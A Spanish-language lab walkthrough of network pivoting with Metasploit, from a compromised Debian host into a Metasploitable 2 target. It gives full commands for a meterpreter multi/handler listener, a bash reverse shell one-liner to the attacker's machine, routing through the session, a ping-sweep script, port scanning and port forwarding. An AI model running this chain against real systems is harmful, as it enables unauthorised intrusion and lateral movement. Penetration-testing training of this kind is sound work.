# Pivoting en Linux usando Metasploit

![Laboratorio de prueba](/Pivoting-Linux.png)

En primer lugar, debemos ganar acceso a la máquina Debian para luego hacer el pivoting al la máquina objetivo Metasploitable 2.

#### Reconocimiento

```bash
$ arp-scan -I eth0 --localnet --ignoredups
```

Identificamos la ip objetivo: 192.168.1.16

En este punto, realizaríamos el escaneo con _nmap_ para encontrar los distintos puertos abiertos, vulnerabilidades, etc. En este caso, como es un laboratorio para practicar pivoting, simplemente enviaremos una reverse shell desde la máquina Debian a nuestro Kali.

Iniciamos metasploit para ejecutar el exploit `multi/handler` y asi establecer una escucha que nos dara acceso a una sesión de meterpreter.

```bash
$ msfbd run
msf6> workspace -a PivotingLab
msf6> use exploit/multi/handler
msf6> set LHOST 192.168.1.3
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6> run
```

Luego, en la máquina Debian enviamos la reverse shell

```bash
$ bash -i >& /dev/tcp/192.168.1.3/4444 0>&1
```

Enviamos a segundo plano la sesión de meterpreter y ejecutamos el siguiente comando para enrutar el tráfico, en este caso, de la subnet `10.0.2.8/24`:

```bash
meterpreter > ifconfig -> listas las interfaces de red
meterpreter > ^Z
msf6> route add 10.0.2.8 255.255.255.0 2
```

#### Host Discovery

Podemos usar el siguiente script para descubrir host activos dentro de la subred. Este script, deberíamos ejecutarlo en la máquina intermedia.

```bash
#!/bin/bash
# host-discovery.sh

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.0.2.$i" &>/dev/null && echo "[+] Host 10.0.2.$i - ACTIVO" &
done; wait
```

Para descubrir los puertos abiertos en la máquina, podemos usar el modulo `auxiliary/scanner/portscan/tcp`.

```bash
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.0.2.5
msf6> set PORTS 1-1000
```

Redirección de puertos / Port Forwarding

```bash
msf6> sessions 2
meterpreter> portfwd add -l 5000 -p 80 -r 10.0.2.5
```

Con el comando anterior, redireccionamos el puerto 80 de la máquina objetivo 10.0.2.5 a el puerto 5000 de nuestra máquina atacante.
